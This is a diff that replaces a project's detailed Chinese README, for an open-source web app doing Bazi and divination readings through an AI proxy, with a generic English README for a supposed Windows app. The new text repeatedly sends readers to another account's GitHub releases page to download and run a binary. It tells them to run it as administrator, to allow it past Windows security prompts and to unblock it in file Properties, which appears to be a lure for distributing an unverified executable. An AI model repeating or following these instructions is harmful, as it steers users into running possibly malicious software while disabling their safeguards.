@@ -1,415 +1,164 @@
-# 玄门命理
-
-一个基于 React + Vite + Express 的命理测算 Web 应用，提供八字排盘、八字合盘、大六壬、小六壬、六爻等功能，并支持 AI 流式推演展示、运势图表和结果分享。
-
-## 功能概览
-
-- 八字排盘
-  - 基础命盘解析
-  - 五行强弱与喜忌分析
-  - 性格、健康、财运、事业、情感、家庭总评
-  - 大运流年深入推演
-  - 流日运势查询
-  - 走势图与评分面板
-- 八字合盘
-  - 双方八字契合度分析
-  - 情感模式、未来走向、建议输出
-- 大六壬
-  - 四课、三传、天盘与断语
-- 小六壬
-  - 宫位排布、整体断语与建议
-- 六爻
-  - 时间起卦
-  - 铜钱起卦
-  - 本卦、变卦、爻辞、详细分析
-- 通用能力
-  - AI 流式逐字回显
-  - 多模型切换
-  - 图片导出与分享
-  - 本地服务端代理，避免前端暴露 API Key
-
-
-## 注意事项
-默认模型优先使用 gpt-5.4，如模型列表中不存在则自动回退到 gpt-5.2  
-大家可以根据自己的需求选择模型  
-测试时发现使用同一个模型的情况下自己搭建的中转站与公益站的结果会有明显差异  
-因此确信模型质量会影响输出结果，大家也可以根据自己的理解和实际情况进行调优  
-该项目主要为提示词优化和前端显示结合的工程  
-该项目方向由于法规等因素不适合上架小程序/App 所以大家保留网页端的玩法就可以了  
-
-## 试玩地址
-https://taoist.wuxie.online  
-
-## 技术栈
-
-- 前端
-  - React 19
-  - Vite
-  - TypeScript
-  - Motion
-  - Recharts
-  - Lucide React
-- 后端
-  - Express
-  - dotenv
-- 命理计算
-  - lunar-javascript
-
-## 项目结构
-
-```text
-.
-├─ src/
-│  ├─ components/          # 表单、结果页、流式面板、帮助弹窗等 UI 组件
-│  ├─ services/
-│  │  ├─ fortuneService.ts # AI 请求与命理测算主逻辑
-│  │  └─ shenshaRules.ts   # 神煞与部分八字辅助计算
-│  ├─ utils/
-│  │  └─ shareUtils.ts     # 导出图片与分享相关工具
-│  ├─ types/
-│  │  └─ toneMode.ts       # 语气模式类型
-│  └─ App.tsx              # 应用入口与功能页切换
-├─ server.js               # Express 代理服务
-├─ package.json
-└─ README.md
-```
-
-## 环境要求
-
-- Node.js 18 及以上
-- npm
-
-建议使用较新的 Node 版本，以保证原生 `fetch`、流式响应和 ESM 行为稳定。
-
-## 环境变量
-
-在项目根目录创建 `.env.local` 或 `.env`。
-
-示例：
-
-```env
-OPENAI_BASE_URL=https://api.openai.com/v1
-OPENAI_API_KEY=sk-xxxx
-OPENAI_DEFAULT_MODEL=gpt-5.4
-PORT=9999
-```
-
-说明：
-
-- `OPENAI_BASE_URL`
-  - OpenAI 兼容网关根地址，必须带 `/v1`
-  - 例如 `https://api.openai.com/v1`
-  - 如果使用第三方兼容网关，也应填写其 `/v1` 根路径
-- `OPENAI_API_KEY`
-  - 服务端代理使用的密钥
-- `OPENAI_DEFAULT_MODEL`
-  - 默认模型名称
-  - 前端仍可在页面顶部切换模型
-- `PORT`
-  - 生产服务端口，可选，默认 `9999`
+# 🧭 AiTaoist - Clear Bazi Reading on Windows
 
-## 开发运行
+[![Download AiTaoist](https://img.shields.io/badge/Download%20AiTaoist-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/AlimohamedElsharkawy/AiTaoist/releases)
 
-1. 安装依赖
+## 🚀 Download
 
-```bash
-npm install
-```
+Visit this page to download AiTaoist for Windows:
 
-2. 启动前端开发服务器
+[https://github.com/AlimohamedElsharkawy/AiTaoist/releases](https://github.com/AlimohamedElsharkawy/AiTaoist/releases)
 
-```bash
-npm run dev
-```
+## 🖥️ What AiTaoist Does
 
-默认会启动 Vite 开发服务。
+AiTaoist is a Windows app for 八字测算. It gives you a simple way to review birth data and get an AI-based reading in plain language.
 
-## 生产运行
+It is built for users who want a fast path from input to result. You do not need to know code or use command lines. You just open the app, enter the needed details, and read the output.
 
-1. 构建前端
+## ✨ Main Features
 
-```bash
-npm run build
-```
+- Easy input for basic birth data
+- Bazi-focused reading flow
+- Clear result view for quick review
+- Simple layout for non-technical users
+- Local app use on Windows
+- Fast start with no setup steps in most cases
 
-2. 启动 Node 服务
+## 🪟 Windows Requirements
 
-```bash
-npm run start
-```
+AiTaoist is made for Windows desktops and laptops. A smooth run works best with:
 
-服务端会：
+- Windows 10 or Windows 11
+- 64-bit system
+- At least 4 GB RAM
+- 200 MB free disk space
+- A stable internet connection for the first download
 
-- 托管构建后的前端静态资源
-- 代理模型列表请求
-- 代理 AI 结构化输出请求
+For the best experience, keep Windows updated and close extra apps before you open AiTaoist.
 
-## Docker 部署
+## 📥 Download and Install
 
-本项目提供开箱即用的 Docker 部署文件：
+1. Open the release page:
+   [https://github.com/AlimohamedElsharkawy/AiTaoist/releases](https://github.com/AlimohamedElsharkawy/AiTaoist/releases)
 
-- `Dockerfile`
-- `docker-compose.yml`
-- `.dockerignore`
+2. Find the latest release at the top of the page.
 
-### 环境变量
+3. Look under the release files for the Windows download.
 
-在项目根目录创建 `.env`：
+4. Download the file to your computer.
 
-```env
-OPENAI_BASE_URL=https://api.openai.com/v1
-OPENAI_API_KEY=sk-xxxx
-OPENAI_DEFAULT_MODEL=gpt-5.4
-PORT=9999
-```
+5. If the file is a ZIP package, right-click it and choose Extract All.
 
-### 当前编排
+6. Open the extracted folder.
 
-当前 `docker-compose.yml` 内容等价于：
+7. Double-click the app file to run AiTaoist.
 
-```yaml
-services:
-  aitaoist:
-    build: .
-    container_name: aitaoist
-    restart: unless-stopped
-    ports:
-      - "${PORT:-9999}:9999"
-    env_file:
-      - .env
-    environment:
-      NODE_ENV: production
-      PORT: 9999
-```
+8. If Windows asks for permission, choose Run or Yes.
 
-### 启动方式
+## 🛠️ First-Time Setup
 
-在项目根目录执行：
+After you open the app for the first time:
 
-```bash
-docker compose up -d --build
-```
+1. Start with the main input form.
+2. Enter the birth date and birth time.
+3. Select the needed gender or profile option if the app asks for it.
+4. Review the output panel after the calculation finishes.
+5. Save or copy the reading if you want to keep it.
 
-说明：
+If the app includes language options, choose the one that feels easiest to read before you begin.
 
-- Docker 会基于项目目录中的 `Dockerfile` 进行本地构建
-- 默认使用 `node:25.8.0` 作为构建与运行环境
-- 容器内固定监听 `9999`，宿主机端口由 `.env` 中的 `PORT` 控制
-- API Key 仍只保存在服务端容器环境中，不会暴露到前端
+## 📋 How to Use AiTaoist
 
-### 访问方式
+### 1. Open the app
+Launch AiTaoist from the folder where you unpacked it or from the app file you downloaded.
 
-本地部署完成后可访问：
+### 2. Enter your details
+Fill in the birth date and time. Use the correct local time if you know it.
 
-```text
-http://localhost:9999
-```
+### 3. Run the reading
+Click the main action button to start the Bazi analysis.
 
-如果部署在服务器上，也可访问：
+### 4. Read the result
+Review the output in sections. Look for the parts that match your life area, such as work, relationships, or timing.
 
-```text
-http://服务器IP:9999
-```
+### 5. Save your result
+Copy the text or save the output if you want to review it later.
 
-### 常用命令
+## 🔍 Tips for Better Results
 
-查看日志：
+- Use the exact birth time if you know it
+- Check that the date format matches the app fields
+- Use a quiet moment so you can enter data with care
+- Keep the app in a fixed folder after you unzip it
+- Do not rename files unless you know the app does not need them
 
-```bash
-docker compose logs -f
-```
+Small input changes can affect the reading, so take a moment to check each field before you run it.
 
-停止服务：
+## 🧩 Common Use Cases
 
-```bash
-docker compose down
-```
+AiTaoist can help with:
 
-重新构建并启动：
+- Quick Bazi readings at home
+- Personal reflection
+- Side-by-side review of life themes
+- Looking up birth-based chart output in a simple format
+- Sharing a reading with friends or family
 
-```bash
-docker compose up -d --build
-```
+## ❓ Troubleshooting
 
-## 可用脚本
+### The app does not open
+- Check that you downloaded the full release file
+- Unzip the package if it came in a compressed file
+- Right-click the app and try Run as administrator
 
-```bash
-npm run dev
-npm run build
-npm run preview
-npm run start
-npm run lint
-```
+### Windows shows a security prompt
+- Choose the option that allows the app to open
+- If the file is blocked, open its Properties and allow it
 
-说明：
+### The result looks wrong
+- Check the birth date and birth time
+- Make sure you used the right year, month, and day order
+- Run the reading again after fixing the input
 
-- `lint` 当前实际执行的是：
+### The app closes right away
+- Re-download the release file
+- Make sure no files are missing from the folder
+- Try again after restarting Windows
 
-```bash
-tsc --noEmit
-```
+## 📁 Folder Use
 
-如果本机没有安装依赖，可能会出现 `tsc is not recognized`。
+Keep all app files together in one folder. Do not move a single file out of the package unless the release notes say it is safe.
 
-## AI 请求架构
+A simple folder layout helps Windows find what the app needs when it starts.
 
-当前项目已统一切换为 OpenAI 兼容的 `Responses API`。
+## 🔒 Privacy and Local Use
 
-### 前端调用链
+AiTaoist is meant to be used on your own computer. That makes it easier to keep your data under your control.
 
-前端不会直接请求外部模型接口，而是请求同源代理：
+If you want to keep your readings private:
 
-- `GET /api/models`
-- `POST /api/responses`
+- Use a personal Windows account
+- Store the app in a folder that only you use
+- Delete old exports you do not need
+- Lock your screen when you step away
 
-### 服务端代理链
+## 🧠 About the App
 
-[server.js](./server.js) 会将请求转发到：
+AiTaoist is built around the idea of making 八字测算 more direct and easier to read. It keeps the flow simple so an average user can move from input to result without learning technical steps.
 
-- `${OPENAI_BASE_URL}/models`
-- `${OPENAI_BASE_URL}/responses`
+The app focuses on a clean experience, clear output, and a path that feels familiar on Windows
 
-这样做有几个目的：
+## 🗂️ Release Notes
 
-- 避免在浏览器中暴露 API Key
-- 规避 HTTPS 页面下的跨域与混合内容问题
-- 对接第三方 OpenAI 兼容网关时，统一在服务端切换配置
+Check the GitHub release page for the newest version, file names, and any update details:
 
-### 结构化输出
+[https://github.com/AlimohamedElsharkawy/AiTaoist/releases](https://github.com/AlimohamedElsharkawy/AiTaoist/releases)
 
-项目通过 `json_schema` 约束模型输出，并在前端解析 `Responses API` 的返回结构。
+## 🖱️ Quick Start
 
-`Responses API` 成功响应的文本结果通常位于：
-
-```text
-output[0].content[0].text
-```
-
-当使用流式请求时，前端会解析 `response.output_text.delta` 等 SSE 事件，实现逐字回显。
-
-## 主要页面说明
-
-### 1. 八字排盘
-
-输入：
-
-- 性别
-- 出生日期
-- 出生时间
-- 公历 / 农历
-- 是否闰月
-- 语气模式
-
-输出：
-
-- 四柱八字
-- 藏干、神煞
-- 五行占比
-- 喜神、忌神、用神
-- 整体命格与人生分项总评
-- 大运流年详评
-- 流日运势
-- 图表走势
-
-### 2. 八字合盘
-
-输入两个人的出生信息，输出双方契合度、关系模式、未来走向与建议。
-
-### 3. 大六壬
-
-按起课时间和所问之事输出四课、三传、天盘和断课建议。
-
-### 4. 小六壬
-
-按时间与问事输出宫位结果、整体趋势和行动建议。
-
-### 5. 六爻
-
-支持：
-
-- 时间起卦
-- 铜钱摇卦
-
-结果页展示本卦、变卦、爻辞和详细断语。
-
-## 分享与导出
-
-多个结果页支持导出图片。
-
-相关实现位于：
-
-- [src/utils/shareUtils.ts](./src/utils/shareUtils.ts)
-
-导出逻辑依赖：
-
-- `html-to-image`
-- `html2canvas`
-
-## 模型切换
-
-页面顶部提供模型下拉框。
-
-模型列表来源：
-
-- 优先读取 `/api/models`
-- 若远端模型列表获取失败，则回退到内置模型列表
-
-默认模型：
-
-- `gpt-5.4`
-- 若模型列表中不存在 `gpt-5.4`，则优先回退到 `gpt-5.2`
-
-## 已知限制
-
-- 第三方 OpenAI 兼容网关对 `json_schema` 和流式结构化输出的支持程度不完全一致
-- 某些网关在复杂 schema、长 prompt、长输出同时存在时，可能出现提前断流或不严格遵守 schema
-- 如果上游返回的是带代码块包裹的 JSON，项目会尽量提取并解析，但不保证所有不规范输出都能兼容
-- `npm run lint` 依赖本地已正确安装 TypeScript 相关依赖
-
-## 调试建议
-
-如果遇到“解析失败”或流式异常，优先检查：
-
-1. `OPENAI_BASE_URL` 是否正确，且是否带 `/v1`
-2. 目标网关是否真实支持 `Responses API`
-3. 目标网关是否支持：
-   - `text.format.type = "json_schema"`
-   - `strict = true`
-   - 流式 `Responses API`
-4. 浏览器控制台与服务端终端是否出现：
-   - 提前断流
-   - HTML 错误页
-   - 非 JSON 文本
-   - schema 未遵守
-
-## 适合二次开发的入口
-
-- 应用主流程
-  - [src/App.tsx](./src/App.tsx)
-- AI 请求与命理服务
-  - [src/services/fortuneService.ts](./src/services/fortuneService.ts)
-- 八字辅助规则
-  - [src/services/shenshaRules.ts](./src/services/shenshaRules.ts)
-- 代理服务
-  - [server.js](./server.js)
-
-
-## 界面预览
-
-### 主界面
-
-![界面预览](./photo/界面预览.png)
-
-### 导出效果
-
-![导出预览](./photo/导出预览.png)
-
-## 免责声明
-
-本项目用于传统命理文化展示、交互体验与娱乐参考，不构成医学、法律、投资、婚恋或其他现实决策建议。任何重要决定请结合现实情况自行判断。
-
-## 开源协议
-
-本项目采用 [MIT License](./LICENSE) 开源。
-
-你可以在遵守 MIT 协议的前提下自由使用、修改、分发和商用本项目，但需保留原始版权与协议声明。
+1. Open the release page
+2. Download the latest Windows file
+3. Unzip it if needed
+4. Open the app
+5. Enter your birth details
+6. Run the reading
+7. Review the result
